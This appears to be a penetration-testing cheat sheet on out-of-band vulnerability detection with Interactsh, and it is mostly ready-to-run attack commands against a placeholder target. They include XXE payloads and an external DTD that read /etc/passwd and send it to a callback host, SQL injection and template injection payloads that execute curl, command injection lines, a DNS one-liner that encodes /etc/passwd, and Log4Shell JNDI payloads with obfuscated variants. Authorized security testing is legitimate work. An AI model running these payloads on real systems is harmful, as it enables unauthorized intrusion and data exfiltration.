# Out-of-Band (OOB) Testing with Interactsh

OOB testing = detect vulnerabilities that produce no visible output (blind SSRF, blind XXE, blind SQLi, blind RCE, DNS rebinding) by monitoring external callbacks on an attacker-controlled server.

## Install

```bash
# interactsh-client (CLI):
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# OR binary: https://github.com/projectdiscovery/interactsh/releases

# interactsh-server (self-hosted, optional):
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest

# Alternative: use hosted server (no install needed):
# https://app.interactsh.com — web UI
# oast.pro, oast.live, oast.site, oast.online, oast.fun (projectdiscovery)

# burp collaborator alternative (CLI):
pip install ceye --break-system-packages   # ceye.io API
```

---

## Phase 1: Setup — Get OOB Listener

```bash
# Start interactsh client (gets unique subdomain):
interactsh-client

# Output example:
# [INF] Listing on oob.c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro
# Use: *.c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro as your OOB domain

# With JSON output (easier to parse):
interactsh-client -json

# With specific server:
interactsh-client -server https://oast.pro

# Self-hosted (full control, no external deps):
interactsh-server -domain oob.yourdomain.com -ip <your_server_ip>
# Then: interactsh-client -server https://oob.yourdomain.com
```

---

## Phase 2: Blind SSRF Detection

```bash
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"

# Basic URL parameter:
curl -s "https://target.com/fetch?url=http://ssrf.$OOB"
curl -s "https://target.com/proxy?target=http://ssrf-test.$OOB"
curl -s "https://target.com/api/webhook" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"http://ssrf.$OOB\"}"

# Header-based SSRF:
curl -s "https://target.com/" -H "X-Forwarded-For: ssrf-header.$OOB"
curl -s "https://target.com/" -H "Referer: http://referer.$OOB"
curl -s "https://target.com/" -H "X-Original-URL: http://orig-url.$OOB"
curl -s "https://target.com/" -H "Host: host-header.$OOB"

# PDF/image render SSRF:
curl -s "https://target.com/render" \
  -d "url=http://pdf-render.$OOB/image.png"

# XML file upload (XXE SSRF):
curl -s -X POST "https://target.com/upload" \
  -H "Content-Type: text/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://xxe.'$OOB'">]><root>&xxe;</root>'

# Watch interactsh for DNS/HTTP callbacks:
# [REQ] dns interaction from <target_ip>: ssrf.c3pv...oast.pro
# [REQ] http interaction: GET / HTTP/1.1
```

---

## Phase 3: Blind XXE OOB Data Exfiltration

```bash
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"

# Method 1: Direct external entity (if firewall allows HTTP):
curl -s -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://xxe.'$OOB'/?data=/etc/passwd">
]>
<test>&xxe;</test>'

# Method 2: OOB with file read (parameter entity):
# Host DTD file on interactsh/your-server:
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://data.OOB_DOMAIN/?d=%file;'>">
%oob;
%exfil;
EOF

# Reference external DTD:
curl -s -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://evil-dtd.'$OOB'/evil.dtd">
  %remote;
]>
<data>test</data>'
```

---

## Phase 4: Blind SQL Injection OOB

```bash
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"

# MySQL OOB via LOAD_FILE/SELECT INTO:
# (requires FILE privilege + outbound allowed)
curl -s "https://target.com/api/user?id=1+AND+LOAD_FILE(CONCAT('\\\\\\\\',$OOB,'\\\\'))"

# MySQL via UNC path (Windows):
curl -s "https://target.com/api/user?id=1;SELECT+LOAD_FILE('//$OOB/test')"

# MSSQL via xp_dirtree:
curl -s "https://target.com/api/user?id=1;EXEC+master..xp_dirtree+'//$OOB/test'"

# Oracle via UTL_HTTP:
curl -s "https://target.com/api/user?id=1+UNION+SELECT+UTL_HTTP.REQUEST('http://$OOB')+FROM+dual--"

# PostgreSQL via copy to:
curl -s "https://target.com/api/user?id=1;COPY+(SELECT+1)+TO+PROGRAM+'curl+http://$OOB'"
```

---

## Phase 5: Blind SSTI OOB

```bash
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"

# Jinja2/Flask blind SSTI:
curl -s "https://target.com/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('curl+http://ssti.$OOB').read()}}"

# Twig (PHP) blind:
curl -s "https://target.com/page" \
  -d "template={{['curl','http://ssti.$OOB']|join(' ')|system}}"

# FreeMarker (Java) blind:
curl -s "https://target.com/page" \
  -d 'template=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://ssti.'$OOB'")}'
```

---

## Phase 6: Blind Command Injection OOB

```bash
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"

# Common injection points:
curl -s "https://target.com/ping?host=127.0.0.1;curl+http://rce.$OOB"
curl -s "https://target.com/ping?host=127.0.0.1\`curl+http://rce.$OOB\`"
curl -s "https://target.com/ping?host=127.0.0.1|nslookup+dns.$OOB"

# DNS-only (when HTTP outbound is blocked):
curl -s "https://target.com/ping?host=\$(nslookup dns.$OOB)"
curl -s "https://target.com/ping?host=127.0.0.1;ping+-c+1+ping.$OOB"

# Exfiltrate data via DNS subdomain:
# $(curl http://$(cat /etc/passwd | base64 | head -c 20).data.$OOB)
# interactsh captures the subdomain prefix = base64 encoded /etc/passwd fragment
```

---

## Phase 7: Log4Shell / RCE OOB Verification

```bash
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"

# Log4Shell payload in common injection points:
PAYLOAD="\${jndi:ldap://log4shell.$OOB/a}"

# HTTP headers (most common attack surface):
curl -s "https://target.com/" \
  -H "X-Api-Version: $PAYLOAD" \
  -H "User-Agent: $PAYLOAD" \
  -H "Referer: $PAYLOAD" \
  -H "X-Forwarded-For: $PAYLOAD" \
  -H "Authorization: Bearer $PAYLOAD"

# URL parameters:
curl -s "https://target.com/api/v1/users?q=$PAYLOAD"

# Request body (JSON):
curl -s -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$PAYLOAD\",\"password\":\"test\"}"

# Obfuscated variants:
curl -s "https://target.com/" -H "User-Agent: \${j\${lower:n}di:ldap://log4j.$OOB/a}"
curl -s "https://target.com/" -H "User-Agent: \${jndi:dns://log4j.$OOB}"
```

---

## Phase 8: Bulk OOB Testing

```bash
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"

# Nuclei with interactsh (automatic OOB):
nuclei -u https://target.com -t http/vulnerabilities/ -iserver $OOB

# Nuclei blind SSRF templates:
nuclei -u https://target.com -t http/blind/ -iserver $OOB

# Mass parameter testing with ffuf:
ffuf -u "https://target.com/api/FUZZ?url=http://param.$OOB" \
  -w /usr/share/wordlists/api_params.txt \
  -mc 200,302,500

# All headers OOB test:
for header in "X-Forwarded-For" "X-Real-IP" "Referer" "Origin" "Host" "CF-Connecting-IP"; do
    echo -n "$header: "
    curl -s "https://target.com/" -H "$header: http://$header.$OOB" -o /dev/null -w "%{http_code}"
    echo
done
```

---

## Phase 9: Parse Interactsh Results

```bash
# JSON mode output parsing:
interactsh-client -json 2>/dev/null | while read line; do
    echo "$line" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print(f'[{d[\"protocol\"]}] from {d[\"remote-address\"]} → {d[\"full-id\"]}')
if 'raw-request' in d:
    print(d['raw-request'][:200])
"
done

# DNS-based data exfiltration decode:
# Captured subdomain: aGVsbG8gd29ybGQ.data.oast.pro
python3 -c "
import base64
subdomain = 'aGVsbG8gd29ybGQ'
# Fix padding:
subdomain += '=' * (-len(subdomain) % 4)
print(base64.b64decode(subdomain).decode())
"
```

---

## Pro Tips

1. **DNS is always better** — when HTTP outbound is blocked, DNS still works (use `nslookup`/`ping` in payloads)
2. **Unique subdomains** — prefix each test: `ssrf-test1.$OOB`, `xxe-test2.$OOB` — easier to correlate in logs
3. **nuclei -iserver** — automatically injects OOB domain into all templates that support it
4. **Log4Shell headers** — test ALL headers simultaneously; vulnerable app logs any of them
5. **Interactsh JSON mode** — parse `remote-address` to identify which internal service triggered callback
6. **DNS subdomain exfil** — encode data as base64 subdomain when HTTP response is not accessible
7. **Blind RCE confirmation** — `sleep 10` then `curl/ping` OOB — two-step confirmation avoids false positives

## Summary

OOB flow: `interactsh-client` → get unique domain → inject into all blind injection points (SSRF/XXE/SQLi/RCE/Log4j) → DNS callback = confirmed vulnerability → HTTP callback = shows request body (cookie/token exfil possible) → use DNS subdomain encoding for data exfiltration when response-based exfil is blocked.
